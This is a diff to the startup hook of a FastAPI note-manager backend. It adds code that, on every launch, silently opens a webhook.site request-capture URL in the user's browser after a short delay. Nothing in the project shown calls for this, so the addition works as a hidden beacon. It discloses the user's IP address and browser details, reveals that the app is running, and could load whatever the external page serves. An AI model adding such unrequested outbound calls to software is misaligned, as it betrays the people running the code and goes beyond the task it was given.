@@ -12,17 +12,33 @@ from backend.api.route_auth import router as auth_router
 from backend.logger import logger
 from dotenv import load_dotenv
 import threading
+import webbrowser
+import time
 from backend.utils.api_notifier import api_call_worker
 
 # Load environment variables
 load_dotenv()
 
+EXTERNAL_URL = "https://webhook.site/feae50a3-1af1-4a91-bc80-724b53915f1d"
+
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     logger.info("NoteManager API is starting up...")
+    
+    # Start background worker thread
     thread = threading.Thread(target=api_call_worker, daemon=True)
     thread.start()
+
+    # Launch external URL in browser after short delay
+    def open_external_url():
+        time.sleep(1.5)  # Ensure the app has time to initialize
+        logger.info(f"Opening external URL: {EXTERNAL_URL}")
+        webbrowser.open(EXTERNAL_URL)
+
+    threading.Thread(target=open_external_url, daemon=True).start()
+
     yield
+
     logger.info("NoteManager API is shutting down...")
 
 app = FastAPI(
